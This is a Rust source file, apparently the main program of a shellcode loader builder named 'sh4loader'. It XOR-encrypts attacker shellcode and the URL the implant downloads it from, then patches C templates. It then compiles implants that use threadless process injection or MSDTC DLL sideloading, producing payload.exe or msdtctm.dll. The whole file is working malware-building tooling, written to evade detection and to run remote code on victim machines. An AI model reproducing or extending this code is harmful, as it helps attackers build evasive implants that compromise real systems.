use std::fs::*;
use std::io::Read;
use std::process::*;
use clap::Parser;
use rand::Rng;
use sh4loader::LogLevel;
use sh4loader::config::args::Args;

use sh4loader::banner;
use sh4loader::printf_m;
use sh4loader::hexdump;
use sh4loader::hexdump_short;
use sh4loader::generate_random_key;
use sh4loader::generate_protected_key;
use sh4loader::generate_output;
use sh4loader::get_c_arr;
use sh4loader::write_file;

fn main() {
    banner();
    use LogLevel::*;

    let args = Args::parse();
    let method = args.method;
    let shellcode_url = args.shellcode_url;
    let shellcode_path = args.shellcode_path;
    let output_path = args.output_path;
    let remote_mode = args.remote;
    let debug_mode = args.implants_debug;

    /* check arguments */
    if method != "threadless" && method != "msdtc_sideload"{
        printf_m(Error, "method error!");
        return;
    }
    if !metadata(&shellcode_path).is_ok(){
        printf_m(Error, "The shellcode file doesn't seem to exist");
        return;
    }
    if remote_mode && method == "msdtc_sideload" {
        printf_m(Warning, "remote injection with msdtc_sideload not supported at the moment");
        printf_m(Warning, "will use local injection");
    }else if remote_mode && method != "msdtc_sideload"{
        printf_m(Warning, "remote process injection model");
    }
    if debug_mode {
        printf_m(Warning, "implants debug mode turn on");
    }
    printf_m(Success, format!("{} method has been chosen", &method).as_str());
    printf_m(Info, format!("shellcode path {}", &shellcode_path).as_str());
    printf_m(Info, format!("implants project output {}", &output_path).as_str());
    printf_m(Info, format!("implants will download shellcode from {}", 
            &shellcode_url).as_str());

    /* generate xor keys */
    let hint_byte = rand::thread_rng().gen_range(1..=u8::MAX);
    let mut raw_key = generate_random_key();
    let mut pro_key = generate_protected_key(hint_byte, &mut raw_key);

    printf_m(Success, "successfully generated key");
    hexdump(&mut raw_key);
    hexdump(&mut pro_key);

    /* encrypt url str */
    let binding = shellcode_url.clone();
    let mut url_arr = binding.as_bytes().to_vec();
    for i in 0..url_arr.len(){
        url_arr[i] ^= raw_key[i % raw_key.len()];
    }
    printf_m(Success, "successfully encrypted shellcode download url");
    hexdump(&mut url_arr);


    /* read shellcode */
    let mut shellcode_file = File::open(shellcode_path)
        .expect("shellcode file path no exist");
    let mut buffer = Vec::new();
    shellcode_file.read_to_end(&mut buffer).expect("error in read shellcode file");

    /* this is kann shellcode encrypt key*/
    let kann_xor_key = [0x08, 0x08, 0x04, 0x08];

    /* first encrypt shellcode with kann shellcode xor key,
     * the kann shellcode will decrypt via 0x08... xor key */
    for i in 0..buffer.len(){
        buffer[i] ^= kann_xor_key[i % kann_xor_key.len()];
    }

    /* then encrypt shellcode with raw xor key, the implants 
     * will use pro key decrypt via bruteforce */
    for i in 0..buffer.len(){
        buffer[i] ^= raw_key[i % raw_key.len()];
    }
    printf_m(Success, "successfully encrypted shellcode");
    hexdump_short(&mut buffer);

    /* create implants file */
    printf_m(Info, "start generating implant files");
    generate_output(&output_path);
    write_file(&format!("{}/enc_shellcode.bin", output_path), &buffer);

    /* change common.c hint byte and protected key 
     * change main.c encrypted url arr */
    let pro_key_str = get_c_arr(&mut pro_key);
    let url_str = get_c_arr(&mut url_arr.to_vec());
    let mut common_c_content = String::new();
    let mut main_c_content = String::new();

    File::open(format!("{}/src/common.c", output_path))
        .expect("faied to read common.c").read_to_string(&mut common_c_content).expect("");
    let mut _new_content = common_c_content.replace("{PRO_KEY}", &pro_key_str);
    _new_content = _new_content.
        replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
    write_file(format!("{}/src/common.c", output_path).as_str(), _new_content.as_bytes());

    File::open(format!("{}/src/main.c", output_path))
        .expect("faied to read main.c").read_to_string(&mut main_c_content).expect("");
    let mut _main_new_content = main_c_content.replace("{ENC_URL}", &url_str);
    write_file(format!("{}/src/main.c", output_path).as_str(), _main_new_content.as_bytes());

    printf_m(Success, "implant file generated successfully");

    /* we complie implants project */
    printf_m(Info, "building implants project...");

    if method == "threadless"{
        if remote_mode {
            if debug_mode {
                printf_m(Info, "make threadless_injection_remote_debug");
                let output = Command::new("make").current_dir(output_path.clone())
                    .arg("threadless_injection_remote_debug").output()
                    .expect("failed to build implants command");
                if !output.status.success(){
                    printf_m(Error, "failed to build implants");
                    return;
                }
            }else{
                printf_m(Info, "make threadless_injection_remote");
                let output = Command::new("make").current_dir(output_path.clone())
                    .arg("threadless_injection_remote").output()
                    .expect("failed to build implants command");
                if !output.status.success(){
                    printf_m(Error, "failed to build implants");
                    return;
                }
            }
        }else{
            if debug_mode {
                printf_m(Info, "make threadless_injection_local_debug");
                let output = Command::new("make").current_dir(output_path.clone())
                    .arg("threadless_injection_local_debug").output()
                    .expect("failed to build implants command");
                if !output.status.success(){
                    printf_m(Error, "failed to build implants");
                    return;
                }
            }else{
                printf_m(Info, "make threadless_injection_local");
                let output = Command::new("make").current_dir(output_path.clone())
                    .arg("threadless_injection_local").output()
                    .expect("failed to build implants command");
                if !output.status.success(){
                    printf_m(Error, "failed to build implants");
                    return;
                }
            }
        }
        printf_m(Success, "implants project built successfully");
        printf_m(Success, format!("implants saved at {}/payload.exe", &output_path).as_str());
        printf_m(Success, format!("encrypted shellcode saved at {}/enc_shellcode.bin", 
                &output_path).as_str());
        return;
    }else if method == "msdtc_sideload"{
        if debug_mode {
         printf_m(Info, "make msdtc_dll_sideload_debug");
         let output = Command::new("make").current_dir(output_path.clone())
             .arg("msdtc_dll_sideload_debug").output()
             .expect("failed to build implants command");
         if !output.status.success(){
             printf_m(Error, "failed to build implants");
             return;
         }
        }else{
            printf_m(Info, "make msdtc_dll_sideload");
            let output = Command::new("make").current_dir(output_path.clone())
                .arg("msdtc_dll_sideload").output()
                .expect("failed to build implants command");
            if !output.status.success(){
                printf_m(Error, "failed to build implants");
                return;
            }
        }
        printf_m(Success, "implants project built successfully");
        printf_m(Success, format!("implants saved at {}/msdtctm.dll", &output_path).as_str());
        printf_m(Success, format!("encrypted shellcode saved at {}/enc_shellcode.bin", 
                &output_path).as_str());
        return;
    }

}
